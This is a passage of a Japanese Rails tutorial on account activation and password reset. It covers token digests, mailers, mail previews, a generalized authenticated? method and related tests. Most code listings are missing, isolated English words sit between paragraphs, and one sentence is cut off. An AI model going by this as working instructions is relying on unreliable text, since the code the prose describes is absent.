こうすることで共通のトピックブランチを使えるようになり、便利です。
master
セッション機能 (\ref{sec:sessions_and_failed_login}) を使用して、アカウントの有効化という作業を「リソース」としてモデル化することにします。アカウントの有効化リソースはActive Recordのモデルとはこの際関係ないので、両者を関連付けることはしません。
その代わりに、この作業に必要なデータ (有効化トークンや有効化ステータスなど) をUserモデルに追加することにします。
こういう場合は\kode{update}アクションにするのではないかとお思いの方もいるでしょう。しかし、有効化リンクはメールでユーザーに送られることを思い出してください。このリンクをクリックすれば、ブラウザで普通にクリックしたのと同じことになり、ブラウザから発行されるのは (\kode{update}アクションで使用する\texttt{PATCH}リクエストではなく) 必然的に\texttt{GET}リクエストになります。GETリクエストを受けるにはeditアクションにならざるを得ないわけです。
This
\kode{edit}アクションを使いたいのですから、コマンドラインで\kode{edit}と指定すればよいように思えますが、そうすると使いもしないeditビューやテストまで生成されてしまうのです。
$ rails generate
--no-test-framework
上のコマンドでは、テストを生成しないというオプションを指定していることにご注目ください。
著者はコントローラのテストよりも統合テスト (\ref{sec:activation_test_and_refactoring}) の方が望ましいと考えているので、コントローラのテストを生成しないようにしているのです。
有効化メールでは以下の形式のURLを使用します。
これは、\kode{edit}アクションへの名前付きルートが必要になるということです。
この変更は、ルーティングファイルの\kode{resources}行で行います (リスト\ref{code:account_activations_route})。
アカウント有効化に使用するリソースを追加する
続いて、一意の有効化トークンがユーザー有効化に必要です。
password
token
たとえば、攻撃者が仮にデータベースにアクセスできてしまうと、攻撃者が作成した新しいアカウントを即座に有効にすることができてしまいます。攻撃者はそのアカウントでゆうゆうとログインし、パスワードを変更してそのアカウントの権限を手に入れることでしょう。
following
ダイジェスト
これにより、以下を使用して有効化トークンにアクセスし、
以下のようなコードでユーザーを認証できるようになります。
(これを行うにはリスト\ref{code:authenticated_p}の\kode{authenticated?}メソッドを改良する必要があります)。
続いて、\kode{activated}属性を追加して論理値 (true/false) を取るようにします。これで、\ref{sec:administrative_users}で説明した自動生成の論理値メソッドと同じような感じで、ユーザーが有効であるかどうかをテストできるようになr
最後に、本チュートリアルで使うことはありませんが、ユーザーを有効にしたときの日時も念のために記録しておきます。
変更後のデータモデルは図\ref{fig:user_model_account_activation}のようになります。
Userモデルにユーザー有効化用の属性を追加する
以下のマイグレーションをコマンドラインで実行して図\ref{fig:user_model_account_activation}のデータモデルを追加すると、3つの属性が新しく追加されます。
(上記の2行目にある '>' という文字は、改行を示すためにシェルが自動的に挿入する文字です。手動で入力しないよう、注意してください) \kode{admin} 属性 (リスト\ref{code:admin_migration}) の時と同様に、\kode{activated}属性のデフォルトの論理値を\kode{false}にします (リスト\ref{code:add_activation_to_users_migration})。
アカウント有効化用の属性とインデックスを追加するマイグレーション
<n>  end
いつものようにマイグレーションを実行します。
$ bundle exec rake db:migrate
ユーザーが新しい登録を完了するためには必ずアカウントの有効化が必要になるのですから、有効化トークンや有効化ダイジェストはユーザーオブジェクトが作成される前に作成しておく必要があります。
これによく似た状況を\ref{sec:uniqueness_validation}でも説明しました。メールアドレスをデータベースに保存する前に、メールアドレスを全部小文字に変換する必要があったのでした。
あのときは、\kode{before\_save}コールバックに\kode{downcase}メソッドをバインドしました (リスト\ref{code:email_downcase})。
オブジェクトに\kode{before\_save}コールバックを用意しておくと、オブジェクトが保存される直前、オブジェクトの作成時や更新時にそのコールバックが呼び出されます。しかし今回は、オブジェクトが作成されたときだけコールバックを呼び出したいのです。それ以外のときには呼び出したくないのです。
そこで\kode{before\_create}コールバックが必要になります。このコールバックは以下のように定義できます。
上のコードは\emph{メソッド参照}と呼ばれるもので、こうすることでRailsは\kode{create\_activation\_digest}というメソッドを探し、ユーザーを作成する前に実行するようになります
(リスト\ref{code:email_downcase}では、\kode{before\_save}に明示的にブロックを渡していましたが、メソッド参照の方が一般にお勧めできます)。
private
クラス内で\kode{private}キーワードより下に記述したメソッドは自動的に非公開となります。このことはコンソールセッションですぐ確かめられます。
$ rails console
今回\kode{before\_create}コールバックを使用する目的は、トークンとそれに対応するダイジェストを割り当てるためです。割り当ては以下のように行うことができます。
このコードでは、記憶トークンで使用したトークンのメソッドやダイジェストのメソッドをストレートに使いまわしています。リスト\ref{code:user_model_remember}の\kode{remember}メソッドと比べてみましょう。
# 永続セッションのためにユーザーをデータベースに記憶する
主な違いは、後者の\kode{update_attribute}の使い方にあります。
この違いは、記憶トークンやダイジェストは既にデータベースにいるユーザーのために作成される (その分やりやすい) のに対し、\kode{before_create}コールバックの方はユーザーが作成される\emph{前}に呼び出される (その分面倒) ことが原因です。
このコールバックがあることで、(リスト\ref{code:create_action_strong_parameters}でユーザー登録を行ったときに)\kode{User.new}で新しいユーザーが定義されると、\kode{activation\_token}属性や\kode{activation\_digest}属性を自動的に得られます。後者のactivation_digest属性は既にデータベースのカラムとの関連付けができあがっている (図\ref{fig:user_model_account_activation}) ので、ユーザーが保存されるときに一緒に自動保存されます。
上で説明したことをUserモデルに実装するとリスト\ref{code:user_model_activation_code}のようになります。
有効化トークンは本質的に仮のものでなければならないので、このモデルの\kode{attr\_accessor}にもうひとつ追加しました。
メールアドレスを小文字にするときにもメソッド参照が使用される機会があることにご注目ください。
Userモデルにアカウント有効化のコードを追加する 
email
<n>    end
先に進む前に、サンプルデータとフィクスチャも更新し、テスト時のサンプルとユーザーを事前に有効化しておきましょう (リスト\ref{code:seed_users_activated}とリスト\ref{code:fixture_users_activated})。
なお、\kode{Time.zone.now}はRailsの組み込みヘルパーであり、サーバーのタイムゾーンに応じたタイムスタンプを返します。
サンプルユーザーを最初から有効にしておく
フィクスチャのユーザーを有効にしておく
例
いつものようにデータベースを初期化して、サンプルデータを再度生成し直し、リスト\ref{code:seed_users_activated}の変更を反映します。
$ bundle exec rake db:migrate:reset<n>$ bundle exec rake db:seed
データのモデル化が終わったので、今度はアカウント有効化メールの送信に必要なコードを追加しましょう。
このメソッドではAction Mailerライブラリを使用してUserの\emph{メイラー}を追加します。このメイラーはUsersコントローラの\kode{create}アクションで有効化リンクをメール送信するために使用します。
メイラーの構成はコントローラのアクションとよく似ており、メールのテンプレートをビューと同じ要領で定義できます。
この節ではメイラーとビューを定義して、有効化トークンとメールアドレス (=有効にするアカウントのアドレス) を含むリンクをその中で使用します。
メイラーは、モデルやコントローラと同様に\kode{rails generate}で生成できます。
上のコマンドを実行したことで、本節で必要となる\kode{account_activation}メソッドと、次節 (\ref{sec:password_reset}) で必要となる\kode{password_reset}メソッドが生成されました。
生成したメイラーごとに、ビューテンプレートが2つずつ生成されます。1つはテキストメール用のテンプレート、1つはHTMLメール用テンプレートです。
アカウント有効化メイラーメソッドのテンプレートをリスト\ref{code:generated_account_activation_view_text}とリスト\ref{code:generated_account_activation_view_html}に示します。
アカウント有効化メイラーのテキストビュー (自動生成)
アカウント有効化メイラーのHTMLビュー (自動生成)
生成されたメイラーの動作を簡単に追ってみましょう (リスト\ref{code:generated_application_mailer}とリスト\ref{code:generated_user_mailer})。
リスト\ref{code:generated_application_mailer}には、デフォルトの\kode{from}アドレス (アプリケーション全体で共通) があります。リスト\ref{code:generated_user_mailer}の各メソッドには宛先メールアドレスもあります。
リスト\ref{code:generated_application_mailer}ではメールのフォーマットに対応するメイラーレイアウトも使用されています。なお本チュートリアルの説明には直接関係ありませんが、生成されるHTMLメイラーのレイアウトやテキストメイラーのレイアウトは\kode{app/views/layouts}で確認できます。
生成されたコードにはインスタンス変数\kode{@greeting}も含まれています。このインスタンス変数は、ちょうど普通のビューでコントローラのインスタンス変数を利用できるのと同じように、メイラービューで利用できます。
生成されたApplicationメイラー
生成されたUserメイラー
最初に、生成されたテンプレートをカスタマイズして、実際に有効化メールで使えるようにします (リスト\ref{code:application_mailer})。
次に、ユーザーを含むインスタンス変数を作成してビューで使えるようにし、\kode{user.email}にメール送信します (リスト\ref{code:mail_account_activation})。
新しいデフォルトの\kode{from}アドレスを使用するアプリケーションメイラー
アカウント有効化リンクをメール送信する
テンプレートビューは、通常のビューと同様ERBで自由にカスタマイズできます。ここでは挨拶文にユーザー名を含め、カスタムの有効化リンクを追加します。
この後、Railsサーバーでユーザーをメールアドレスで検索して有効化トークンを認証できるようにしたいので、リンクにはメールアドレスとトークンを両方含めておく必要があります。
AccountActivationsリソースで有効化をモデル化したので、トークン自体はリスト\ref{code:account_activations_route}で定義した名前付きルートの引数で使用されます。
ここで思い出してみましょう。
上のメソッドは、以下の形式のURLを生成します。
http://www.example.com/users/1/edit
これに対応するアカウント有効化リンクのベースURLは以下のようになります。
http://www.example.com/account_activations/q5lt38hQDc_959PVoo6b7A/edit
上のURLの「\kode{q5lt38hQDc\_959PVoo6b7A}」という部分は\kode{new\_token}メソッドで生成されたものです (リスト\ref{code:token_method})。URLで使用できるようにBase64でエンコードされています。これはちょうど/users/1/editの「1」のようなユーザーIDと同じ役割を果たします。
このトークンは、特にActivationsコントローラの\kode{edit}アクションでは\kode{params}ハッシュで\kode{params[:id]}として参照できます。
\emph{クエリパラメータ}を使用して、このURLにメールアドレスもうまく組み込んでみましょう。クエリパラメータとは、URLの末尾で疑問符「?」に続けてキーと値のペアを記述したものです
email=foo%40example.com
このようにして名前付きルートでクエリパラメータを定義すると、Railsが特殊な文字を自動的にエスケープしてくれます。
コントローラで\kode{params[:email]}からメールアドレスを取り出すときには、自動的にエスケープを解除してくれます。
ここまでできれば、リスト\ref{code:mail_account_activation}で定義した\kode{@user}インスタンス変数、editへの名前付きルート、ERBを組み合わせて、必要なリンクを作成できます (リスト\ref{code:account_activation_view_text}とリスト\ref{code:account_activation_view_html})。
リスト\ref{code:account_activation_view_html}のHTMLテンプレートでは、正しいリンクを組立てるために\kode{link\_to}メソッドを使用していることにご注目ください。
アカウント有効化のテキストビュー
アカウント有効化のHTMLビュー
リスト\ref{code:account_activation_view_text}やリスト\ref{code:account_activation_view_html}で定義したテンプレートの実際の表示を簡単に確認するために、\emph{メールプレビュー}という裏技を使ってみましょう。Railsでは、特殊なURLにアクセスするとメールのメッセージをその場でプレビューすることができます。メールを実際に送信しなくてもよいので大変便利です。
これを利用するには、アプリケーションのdevelopment環境の設定に手を加える必要があります (リスト\ref{code:development_email_settings})。
development環境のメール設定
リスト\ref{code:development_email_settings}のホスト名「\kode{’example.com’}」の部分は各自のdevelopment環境に合わせて変更してください。
たとえば、著者のシステムでは以下のどちらでも動くようになっています (クラウドIDEとローカルサーバーで使い分けています)。
developmentサーバーを再起動してリスト\ref{code:development_email_settings}の設定を読み込んだら、次は\ref{sec:account_activation_mailer}で自動生成したUserメイラーの\emph{プレビューファイル}の更新が必要です (リスト\ref{code:generated_user_mailer_previews})。
Userメイラープレビュー (自動生成)
  end
リスト\ref{code:mail_account_activation}で定義した \kode{account\_activation} の引数には有効な (=実在する) ユーザーオブジェクトを渡す必要があるため、リスト\ref{code:generated_user_mailer_previews}はこのままでは動きません。
このコードはリスト\ref{code:account_activation_view_text}で使用されていました。もうひとつ、
なお、\kode{activation\_token}は仮の属性でしかないので (\ref{sec:account_activations_resource})、データベースのユーザーはこの値を実際には持っていません。
アカウント有効化のプレビューメソッド (動作可能)
リスト\ref{code:account_activation_preview}のプレビューコードを実装すると、指定のURLでアカウント有効化メールをプレビューできるようになります
HTMLメールとテキストメールのプレビューを図\ref{fig:account_activation_html_preview}と図\ref{fig:account_activation_text_preview}に示します。
アカウント有効化メールのプレビュー (HTMLバージョン)
アカウント有効化メールのプレビュー (テキストバージョン)
最後に、このメールプレビューのテストも作成して、プレビューをダブルチェックできるようにします。
便利なテスト例がRailsによって自動生成されているので(リスト\ref{code:generated_user_mailer_test})、これを利用すればテストの作成は割と簡単です。
Userメイラーのテスト (Railsによる自動生成)
リスト\ref{code:generated_user_mailer_test}のテストでは、\kode{assert\_match}という非常に強力なメソッドが使用されています。これを使えば、正規表現で文字列をテストできます。
リスト\ref{code:real_account_activation_test}のテストでは、\kode{assert\_match}メソッドを使用して名前、有効化トークン、エスケープ済みメールアドレスがメール本文に含まれているかどうかをテストします。
最後にもうひとつ小技をお教えします。
このメソッドを使うと、ユーザーのメールのテストをエスケープできます
これについてもう少し詳しくお知りになりたい場合は、\href{http://lmgtfy.com/?q=ruby+rails+escape+url}{「ruby rails escape url」で検索してみてください}。
おそらく\href{http://stackoverflow.com/questions/6714196/ruby-url-encoding-string}{2通りの手法} (\kode{URI::encode(str)}と\kode{CGI::escape(str)}) が見つかると思います。
両方試してみるとわかると思いますが、実際に動作するのは後者の方です
(実はもうひとつ方法があります: \kode{ERB::Util}ライブラリの\href{http://apidock.com/ruby/ERB/Util/url_encode}{url_encode}メソッドでも同じことができます)。
現在のメールの実装をテストする 
リスト\ref{code:real_account_activation_test}のテストコードでは、フィクスチャユーザーに有効化トークンを追加している点にご注目ください。追加しない場合は空白になります。
このテストがパスするには、テストファイル内のドメイン名を正しく設定する必要があります (リスト\ref{code:test_domain_host})。
テストのドメインホストを設定する
上のコードを使用すると、テストは \passing になるはずです。
$ bundle exec rake test:mailers
あとはユーザー登録を行う\kode{create}アクションに数行追加するだけで、メイラーをアプリケーションで実際に使うことができます (リスト\ref{code:user_signup_with_account_activation})。
リスト\ref{code:user_signup_with_account_activation}では、登録時のリダイレクトの挙動が変更されている点にご注意ください。
変更前は、ユーザーのプロファイルページ (\ref{sec:successful_signups}) にリダイレクトしていましたが、アカウント有効化を実装するうえでは無意味な動作なので、
リダイレクト先をルートURLに変更してあります。
ユーザー登録にアカウント有効化を追加する 
create
  else
次のようにユーザーidでも関連付けできます。
そこで、失敗が発生するテストの行をひとまずコメントアウトしておきます (リスト\ref{code:comment_out_failing_tests})。
コメントアウトした部分は、\ref{sec:activation_test_and_refactoring}でアカウント有効化のテストをパスさせるときに元に戻します。
失敗するテストを一時的にコメントアウトする 
この状態で実際に新規ユーザーとして登録してみると、リダイレクトされて図\ref{fig:redirected_not_activated}のようになり、リスト\ref{code:account_activation_email}のようなメールが生成されます。
ただし、実際にメールが生成されるわけでは\emph{ない}のでご注意ください。ここに引用したのはサーバーログに出力されたメールです
(メールが見えるまで多少スクロールが必要でしょう)。
production環境で実際にメール送信する方法については\ref{sec:email_in_production}で説明します。
サーバーログに表示されたアカウント有効化メールの例
Sent mail to michael@michaelhartl.com (931.6ms)<n>Date: Wed, 03 Sep 2014 19:47:18 +0000<n>From: noreply@example.com<n>To: michael@michaelhartl.com<n>Message-ID: <540770474e16_61d3fd1914f4cd0300a0@mhartl-rails-tutorial-953753.mail><n>Subject: Account activation<n>Mime-Version: 1.0<n>Content-Type: multipart/alternative;<n> boundary="--==_mimepart_5407704656b50_61d3fd1914f4cd02996a";<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n><n>----==_mimepart_5407704656b50_61d3fd1914f4cd02996a<n>Content-Type: text/plain;<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n>Hi Michael Hartl,<n><n>Welcome to the Sample App!
Click on the link below to activate your account:<n><n>http://rails-tutorial-c9-mhartl.c9.io/account_activations/<n>fFb_F94mgQtmlSvRFGsITw/edit?
email=michael%40michaelhartl.com<n>----==_mimepart_5407704656b50_61d3fd1914f4cd02996a<n>Content-Type: text/html;<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n><h1>Sample App</h1><n><n><p>Hi Michael Hartl,</p><n><n><p><n>Welcome to the Sample App!
Click on the link below to activate your account:<n></p><n><n><a href="http://rails-tutorial-c9-mhartl.c9.io/account_activations/<n>fFb_F94mgQtmlSvRFGsITw/edit?
email=michael%40michaelhartl.com">Activate</a><n>----==_mimepart_5407704656b50_61d3fd1914f4cd02996a--
登録後リダイレクトしたホームページにアカウント有効化確認のメッセージが表示される
リスト\ref{code:account_activation_email}のとおりにメールが生成できたら、今度はAccountActivationsコントローラの\kode{edit}アクションを書いて、実際にユーザーを有効化できるようにする必要があります。
ここで、有効化トークンとメールをそれぞれ \kode{params[:id]}と \kode{params[:email]}で参照できる (\ref{sec:account_activation_mailer} ) ことを思い出してみましょう。
パスワードのモデル (リスト\ref{code:find_authenticate_user}) と記憶トークン (リスト\ref{code:persistent_current_user}) で学んだことを元に、次のようなコードでユーザーを検索して認証することにします。
(この後、上の式にひとつ論理値を追加します。
何が追加されるか考えてみましょう)。
上のコードで使用している\kode{authenticated?}メソッドは、アカウント有効化のダイジェストと、渡されたトークンが一致するかどうかをチェックします。ただし、このメソッドは記憶トークン (リスト\ref{code:authenticated_p}) 用なので今は正常に動作しません。
\kode{remember\_digest}はUserモデルの属性であり、モデル内では以下のように書き換えることができます。
上をどうにかして\emph{変数}として扱いたいのです。そこで以下を呼び出すことにします。
\kode{authenticated?}に該当のパラメータを渡す代わりに、上のようにします。
この一見不思議な手法は「\emph{メタプログラミング}」の最初の例になります。メタプログラミングを一言で言うと「プログラムでプログラムを作成する」ことです。
メタプログラミングはRubyが有するきわめて強力な機能であり、Railsの一見魔法のような機能 (訳注: 「黒魔術」と呼ばれることもあります) の多くは、Rubyのメタプログラミングによって実現されています。
ここで重要なのは、\kode{send}メソッドの強力きわまる機能です。このメソッドは、与えられたオブジェクトに「メッセージを送る」ことによって、メソッド呼び出しに自由に名前を付けることができます。
たとえば、このコンソールセッションでネイティブのRubyオブジェクトに\kode{send}メソッドを実行して、配列の長さを得るとします。
上のコードで、シンボル\kode{:length}や文字列\kode{’length’}を\kode{send}メソッドに渡していますが、これは与えられたオブジェクト (ここではa) の\kode{length}メソッドを呼び出すことと完全に同等です。
もうひとつ例をお見せします。データベースの最初のユーザーが持つ\kode{activation\_digest}属性にアクセスしてみます。
最後の例では、シンボル\kode{:activation}に等しい\kode{attribute}変数を定義し、文字列の式展開 (interpolation) を使用して引数を正しく組み立ててから、\kode{send}に渡していることです。
文字列\kode{’activation’}でも同じことができますが、Rubyではシンボルを使う方が普通です。
シンボルと文字列どちらを使用した場合にも、上のコードは以下のようになります。
"activation_digest"
文字列は式展開されます
(\ref{sec:the_flash}でシンボルが式展開されて文字列になったことを思い出しましょう)。
この配置されたテンプレートで、関数の引数にダイジェスト名を追加してこのメソッドを一般化し、続いて上のように文字列の式展開を使用します。
(上では2番目の引数\kode{token}の名前を変更して、メソッドが一般化されたことをあえて強調しています)。
このコードはモデル内にあるので\kode{self}は省略できます。最終的にRubyらしく書かれたコードは次のようになります。
ここまでできれば、以下のように呼び出すことで\kode{authenticated?}の従来の振舞いを再現できます。
これはリスト\ref{code:generalized_authenticated_p}で使用されていました。
A generalized \kode{authenticated?} 
method.
$ bundle exec rake test
これを解消するために両者を更新して、新しい一般的なメソッドを使用するようにします (リスト\ref{code:generalized_current_user}とリスト\ref{code:test_authenticated_invalid_token_updated})。
Using the generalized \kode{authenticated?} 
# 現在ログイン中のユーザーを返す (いる場合)
  end
この時点では、テストは \passing になるはずです。
コードにこのようなリファクタリングを施すと非常にエラーが発生しやすくなるので (訳注: 黒魔術と呼ばれる理由でもあります)、しっかりしたテストスイートが不可欠です。\ref{sec:login_with_remembering}や\ref{sec:remember_tests}でよいテストを書くためにあえてトラブルを発生させてみたのはそうした理由からです。
\kode{authenticated?}がリスト\ref{code:generalized_authenticated_p}のようになったことで、やっと\kode{edit}アクションを書く準備ができました。このアクションは、\kode{params}ハッシュで与えられたメールアドレスに対応するユーザーを認証します。
ユーザーが有効であることを確認する中核部分は以下のようになります。
このコードは、既に有効になっているユーザーを誤って再度有効化しないために必要です。正当であろうとなかろうと、有効化が行われるとユーザーはログイン状態になります。もしこのコードがなければ、攻撃者がユーザーの有効化リンクを後から盗みだしてクリックするだけで、本当のユーザーとしてログインできてしまいます。そうした攻撃を防ぐためにこのコードは非常に重要です。
上の論理値に基いてユーザーを認証するには、ユーザーを認証してから\kode{activated\_at}タイムスタンプを更新する必要があります。(update_attributesではなくupdate_attributeを実行していることに注目してください。update_attributesだとバリデーションが実行されてしまうため、今回のようにパスワードを入力していない状態で更新すると、バリデーションで失敗してしまいます。)
上のコードを\kode{edit}アクション (リスト\ref{code:account_activation_edit_action}) で使用します。
リスト\ref{code:account_activation_edit_action}では有効化トークンが無効だった場合の処理も行われている点にご注目ください。トークンが無効になるようなことは実際にはめったにありませんが、もしそうなった場合はルートURLにリダイレクトされる仕組みです。
アカウントを有効化する\kode{edit}アクション
リスト\ref{code:account_activation_edit_action}のコードを使用すると、リスト\ref{code:account_activation_email}にあるURLを貼り付けてユーザーを有効化できます。
著者のシステム上では、以下のURLをブラウザで開くと、
http://rails-tutorial-c9-mhartl.c9.io/account_activations/<n>fFb_F94mgQtmlSvRFGsITw/edit?
email=michael%40michaelhartl.com
図\ref{fig:activated_user}のようになりました。
有効化が成功した場合に表示されるプロファイルページ
もちろん、この時点ではユーザーのログイン方法を変更していないので、ユーザーの有効化にはまだ\emph{何の意味もありません}。
ユーザーの有効化が役に立つためには、ユーザーが有効である場合にのみログインできるようにログイン方法を変更する必要があります。
リスト\ref{code:preventing_unactivated_logins}に示したように、これを行うには\kode{user.activated?}がtrueの場合にのみログインを許可し、そうでない場合はルートURLにリダイレクトして\kode{warning}で警告を表示します (図\ref{fig:not_activated_warning})。
有効でないユーザーがログインすることのないようにする
  else
destroy
有効になっていないユーザーに表示される警告メッセージ
これで、ユーザー有効化機能のおおまかな部分については実装できました
(改良すべき点として、有効化されていないユーザーが表示されないようにする必要もあるのですが、これは\ref{sec:activation_resets_exercises}の課題に回すことにします)。
次の\ref{sec:activation_test_and_refactoring}でテストをもう少し追加し、リファクタリングを少々施せば完了です。
この節では、アカウント有効化の統合テストを追加します。
正しい情報でユーザー登録を行った場合のテスト (リスト\ref{sec:a_test_for_valid_submission}) は既にあるので、\ref{code:a_test_for_valid_submission}で開発したテストに若干手を加えることにします。
追加される行数はそこそこ多いのですが、基本的に素直なので心配はありません。リスト\ref{code:signup_with_account_activation_test}をご覧ください。
ユーザー登録のテストにアカウント有効化を追加する 
# 有効化していない状態でログインしてみる
follow_redirect!
リスト\ref{code:signup_with_account_activation_test}のコードは分量が多いように見えますが、本当に重要な部分は以下の1行です。
上のコードは、配信されたメッセージがきっかり1つであるかどうかを確認します。
以下のメソッドになっていることに注意してください。
リスト\ref{code:signup_with_account_activation_test}の\kode{assigns}メソッドは本チュートリアル初登場です。第\ref{cha:log_in_log_out} 章の演習 (\ref{sec:log_in_out_exercises}) で説明したように、\kode{assigns}メソッドを使用すると、対応するアクション内にあるインスタンス変数にアクセスできるようになります。
たとえば、Usersコントローラの\kode{create}アクションでは\kode{@user}というインスタンス変数が定義されています (リスト\ref{code:user_signup_with_account_activation}) ので、テストで\kode{assigns(:user)}とするとこのインスタンス変数にアクセスできるようになります。
最後に、リスト\ref{code:signup_with_account_activation_test}でコメントアウトしておいた行をリスト\ref{code:comment_out_failing_tests}で元に戻していることにご注意ください。
これでテストスイートは \passing になるはずです。
リスト\ref{code:signup_with_account_activation_test}のテストができたので、ユーザー操作の一部をコントローラからモデルに移動するというささやかなリファクタリングを行う準備ができました。
ここでは特に、\kode{activate}メソッドを作成してユーザーの有効化属性を更新し、\kode{send\_activation\_email}メソッドを作成して有効化メールを送信します。
この新しいメソッドをリスト\ref{code:user_activation_methods}に示します。また、リファクタリングされたアプリケーションコードをリスト\ref{code:user_signup_refactored}とリスト\ref{code:account_activation_refactored}に示します。
Userモデルにユーザー有効化メソッドを追加する
# アカウントを有効にする
<n>    .
ユーザーモデルオブジェクトからメールを送信する
ユーザーモデルオブジェクト経由でアカウントを有効化する
リスト\ref{code:user_activation_methods}では\kode{user.}という記法を使用していないことにご注目ください。Userモデルにはそのような変数はないので、これがあるとエラーになります。
(\kode{user}を\kode{self}に切り替えるという手もあるのですが、\kode{self}はモデル内では必須ではないと\ref{sec:uniqueness_validation}で解説したことを思い出しましょう)。
Userメイラー内の呼び出しでは、\kode{@user}が\kode{self}に変更されている点にもご注目ください。
どんなに簡単なリファクタリングであっても、\emph{この手の}変更はつい忘れてしまうものです。テストをきちんと書いておけば、この種の見落としを検出できます。
以上でテストスイートは \passing になるはずです。
ついにアカウントの有効化を実装できました。きりのよい所でGitにコミットしておきましょう。
アカウント有効化の実装が完了し、ユーザーのメールアドレスが正しいことを確認できるようになったので、今度はユーザーがパスワードを忘れてしまった場合に対応できるようにしましょう。
実際にやってみるとわかると思いますが、パスワード再設定の仕組みは、アカウント有効化と似ている部分が多く、\ref{sec:account_activation}で学んだ手法の多くをここでも適用できます。
とは言うものの、最初の部分はそれなりに異なります。アカウントの有効化と異なり、パスワードを再設定する場合はビューを1つ変更する必要があり、新しいフォームも2つ (メールレイアウト用と新しいパスワードの送信用) 必要です。
コードを実際に書く前に、パスワード再設定の想定手順をモックアップ (=スクリーンショット画像を改変して作った模型) で確かめましょう。
まず、サンプルアプリケーションのログインフォームに「forgot password」リンクを追加します (図\ref{fig:login_forgot_password_mockup})。
この「forgot password」リンクをクリックするとフォームが表示され、そこにメールアドレスを入力してメールを送信すると、そのメールにパスワード再設定用のリンクが記載されています (図\ref{fig:forgot_password_form_mockup})。
この再設定用のリンクをクリックすると、ユーザーのパスワードを再設定してよいかどうかの確認を求めるフォームが表示されます (図\ref{fig:reset_password_form_mockup})。
「forgot password」リンクのモックアップ
「forgot password」フォームのモックアップ
パスワード再設定用フォームのモックアップ
アカウント有効化の際と似ていて、PasswordResetsリソースを作成して、再設定用のトークンとそれに対応するダイジェストを保存するのが今回の目的となります。全体の流れは以下のとおりです。
ユーザーがパスワードの再設定をリクエストすると、ユーザーが送信したメールアドレスをキーにしてデータベースからユーザーを見つける。
該当のメールアドレスがデータベースにある場合は、再設定用トークンとそれに対応するリセットダイジェストを生成する。
再設定用ダイジェストはデータベースに保存しておき、再設定用トークンはメールアドレスと一緒に、ユーザーに送信する有効化用メールのリンクに仕込んでおく。
ユーザーがメールのリンクをクリックしたら、アプリケーションはメールアドレスをキーにしてユーザーを探し、データベース内に保存しておいた再設定用ダイジェストと比較することでトークンを認証する。
認証に成功したら、パスワード変更用のフォームをユーザーに表示する。
アカウント有効化 (\ref{sec:account_activations_resource}) の場合と同様、最初に新しいリソースで使用するコントローラを生成します。
\ref{sec:account_activations_resource}のときと同様にテストを生成しないようにするフラグを追加し、代わりに\ref{sec:activation_test_and_refactoring}の統合テストを生成するようにします。
新しいパスワードを再設定するためのフォーム (図\ref{fig:forgot_password_form_mockup}) と、Userモデル内のパスワードを変更するためのフォーム (図\ref{fig:reset_password_form_mockup}) が両方必要になるので、今回は\kode{new}、\kode{create}、\kode{edit}、\kode{update}のルーティングも必要になります。
この変更は、ルーティングファイルの\kode{resources}行で行います (リスト\ref{code:password_resets_resource})。
パスワード再設定用リソースを追加する
リスト\ref{code:password_resets_resource}のコードはRESTfulのルーティング (表\ref{table:RESTful_password_resets}) に従っています。
特に、表\ref{table:RESTful_password_resets}の最初のルーティングでは「forgot password」フォームへのリンク作成に以下を使用しています。
new_password_reset_path
(リスト\ref{code:log_in_password_reset}と図\ref{fig:forgot_password_link}参照)
HTTPリクエスト
名前付きルート
リスト\ref{code:password_resets_resource}のPasswordResetsリソースで提供されるRESTfulルーティング
パスワード再設定画面へのリンクを追加する
Sign up
</div>
「forgot password」リンクのあるログインページ
パスワード再設定のデータモデルも、アカウント有効化の場合と似ています (図\ref{fig:user_model_account_activation})。
記憶トークン (\ref{sec:remember_me}) とアカウント有効化トークン (\ref{sec:account_activation}) で設定したパターンに従い、パスワードの再設定でも、メールに記載する仮想の再設定用トークンと、ユーザーの取得で使う再設定用ダイジェストをペアにすることにします。
トークンをハッシュ化せずにデータベースに保存すると、トークンが攻撃者によってデータベースから読み出されたときにセキュリティ上の問題が生じます: 攻撃者がユーザーのメールアドレスにパスワード再設定のリクエストを送信し、このメールと盗んだトークンを使用して攻撃者がパスワード再設定リンクを開けば、アカウントを奪い取ることができてしまいます。
従って、パスワードの再設定では必ずダイジェストを使用してください。
セキュリティ上の注意点をもうひとつ。再設定用のリンクはなるべく短時間 (数時間以内) で\emph{期限切れ}になるようにしなければなりません。そのために、再設定メールの送信時刻も記録する必要があります。
以上に基いて\kode{reset\_digest}属性と\kode{reset\_sent\_at}属性を追加したユーザーデータベースは図\ref{fig:user_model_password_reset}のようになります。
パスワード再設定で使用する属性を追加したUserモデル
以下を実行して、マイグレーションに図\ref{fig:user_model_password_reset}の属性を追加します。
(上記の2行目にある '>' という文字は、改行を示すためにシェルが自動的に挿入する文字です。手動で入力しないよう、注意してください) 後はいつものようにマイグレーションを実行します。
新しいパスワード再設定の画面を作成するために、前節でActive Recordを使用しないリソースを新規作成したときの手法、つまり、新しいセッションを作成するためのログインフォーム (リスト\ref{code:login_form}) をここでも使用することにします。参考までにリスト\ref{code:login_form_redux}を再掲したのでご覧ください。
ログインフォームのコード (再掲)
新しいパスワード再設定フォームはリスト\ref{code:login_form_redux}と多くの共通点がありますが、重要な違いとして、\kode{form\_for}の呼び出しで使用するリソースとURLが異なっていることと、パスワード属性が省略されていることが挙げられます。
変更を反映した結果をリスト\ref{code:new_password_reset}と図\ref{fig:forgot_password_form}に示します。
新しいパスワード再設定画面ビュ
「forgot password」フォーム
図\ref{fig:forgot_password_form}のフォームから送信を行なった後、メールアドレスをキーとしてユーザーをデータベースから見つけ、パスワード再設定用トークンと送信時のタイムスタンプでデータベースの属性を更新する必要があります。
それに続いてルートURLにリダイレクトし、フラッシュメッセージをユーザーに表示します。
送信が無効の場合は、ログイン (リスト\ref{code:correct_login_failure}) と同様に\kode{new}ページを出力して\kode{flash.now}メッセージを表示します。
変更の結果をリスト\ref{code:create_password_reset}に示します。
パスワード再設定用の\kode{create}アクション
Userモデル内のコードは、\kode{before\_create}コールバック (リスト\ref{code:user_model_activation_code}) 内で使用される\kode{create\_activation\_digest}メソッドと似ています(リスト\ref{code:user_model_password_reset})。
Userモデルにパスワード再設定用メソッドを追加する
